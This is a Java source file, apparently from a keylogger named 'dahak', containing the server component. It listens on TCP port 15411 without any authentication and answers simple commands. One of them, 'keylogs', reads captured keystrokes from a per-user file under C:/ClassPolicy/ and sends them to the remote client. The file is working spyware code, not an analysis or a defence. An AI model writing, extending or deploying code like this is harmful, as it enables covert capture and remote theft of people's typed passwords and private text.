package main;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.io.PrintStream;
import java.net.ServerSocket;
import java.net.Socket;

public class Server 
{
	public Stopwatch st;
	public ServerSocket ssock;
	public Server(Stopwatch st) throws IOException
	{
		this.st = st;
		Chocolat.println("[" + st.elapsedTime() + "] Server Listener initialized.");
		ssock = new ServerSocket(15411);
	}
	public void run() throws IOException
	{
	    Chocolat.println("[" + st.elapsedTime() + "] Server Listening...");
	    while (true) 
	    {
	    	Socket sock = ssock.accept();
	    	Chocolat.println("[" + st.elapsedTime() + "] Server Connected.");
	        new Thread(new ServerThread(sock, st)).start();
	    }
	}
}
class ServerThread implements Runnable
{
	Socket sock;
	Stopwatch st;
	BufferedWriter bw;
	
	boolean isclosed = false;
	
	public ServerThread(Socket sock, Stopwatch st)
	{
		this.sock = sock;
		this.st = st;
	}

	@Override
	public void run() 
	{
		try
		{
			File transferFile = new File ("C:/ClassPolicy/" + System.getProperty("user.name") + ".txt"); 
			String receiveMessage;
			bw = new BufferedWriter(new OutputStreamWriter(sock.getOutputStream()));
			InputStream istream = sock.getInputStream();
			BufferedReader receiveRead = new BufferedReader(new InputStreamReader(istream));
			bw.write("dahak server v1 \n");
			bw.write("Waiting for commands...\n");
			bw.newLine();
			bw.flush();
			for(;;)
			{
				try
				{	
					if (isclosed)
					{
						break;
					}
					while((receiveMessage = receiveRead.readLine()) != null)
					{
						if (isclosed)
						{
							break;
						}
						System.out.println(receiveMessage);
						if (receiveMessage.matches("help"))
						{
							bw.write("=====[COMMANDS]=====\n");
							bw.write("help - list commands\n");
							bw.write("uptime - show uptime\n");
							bw.write("keylogs - show keylogger records\n");
							bw.newLine();
							bw.flush();
						}
						else if (receiveMessage.matches("uptime"))
						{
							bw.write("========[ dahak time page ]========\n");
							double seconds = st.getTime();
							int getDays = (int) (seconds / 60 / 60 / 24);
							int getHours = (int) ((seconds/60/60)%24);
							int getMins = (int) ((seconds / 60)%60);
							int getSecs = (int) (seconds % 60);
							//double getSeconds = seconds / 60 / 60 / 24
							bw.write("UTC: " + getDays + " d " + getHours + " hrs " + getMins + " mins " + getSecs + " sec\n");
							double uptime = st.elapsedTime();
							int getDaysU = (int) (uptime / 60 / 60 / 24);
							int getHoursU = (int) ((uptime/60/60)%24);
							int getMinsU = (int) ((uptime / 60)%60);
							int getSecsU = (int) (uptime % 60);
							bw.write("dahak uptime: " + getDaysU + " d " + getHoursU + " hrs " + getMinsU + " mins " + getSecsU + " sec\n");
							bw.write("========[ End of time page ]========\n");
							bw.newLine();
							bw.flush();
						}
						else if (receiveMessage.matches("keylogs"))
						{
							
							BufferedReader br = new BufferedReader(new FileReader(transferFile));
							String readLog;
							bw.write("dahak keylogs\n");
							while((readLog = br.readLine()) != null)
							{
								bw.write(readLog +"\n");
							}
							bw.newLine();
							bw.flush();
						}
						else if (receiveMessage.matches("exit"))
						{
							bw.write("Exiting...\n");
							bw.newLine();
							bw.flush();
							isclosed = true;
						}
					}
				}
				catch (Exception e)
				{
					Chocolat.println("[" + st.elapsedTime() + "] ServerThread was interrupted: " + e);
					e.printStackTrace();
				}
			}
		}
		catch (IOException ioe)
		{
			Chocolat.println("[" + st.elapsedTime() + "] ServerThread failed: " + ioe);
		}
		// TODO Auto-generated method stub
		
	}
}
